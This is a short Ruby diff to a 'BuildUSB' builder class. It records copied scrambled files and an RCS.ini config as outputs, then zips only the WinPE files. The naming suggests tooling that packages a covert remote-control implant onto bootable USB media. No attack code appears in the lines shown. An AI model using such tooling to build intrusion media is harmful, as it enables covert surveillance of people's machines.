@@ -38,6 +38,7 @@ class BuildUSB < Build
     build.scrambled.keep_if {|k, v| k != :dir and k != :reg}.each_pair do |k, v|
       FileUtils.mkdir_p(path("winpe/RCSPE/files/#{platform.upcase}"))
       FileUtils.cp(File.join(build.tmpdir, v), path("winpe/RCSPE/files/#{platform.upcase}/" + v))
+      @outputs << "winpe/RCSPE/files/#{platform.upcase}/" + v
     end
 
     build.clean
@@ -62,14 +63,15 @@ class BuildUSB < Build
       f.puts "HKEY=#{key}"
     end
 
+    @outputs << 'winpe/RCSPE/RCS.ini'
   end
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      @outputs.each do |out|
-        z.file.open(out, "w") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
+      @outputs.keep_if {|x| x['winpe']}.each do |out|
+        z.file.open(out.gsub("winpe/", ''), "w") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
       end
     end
 
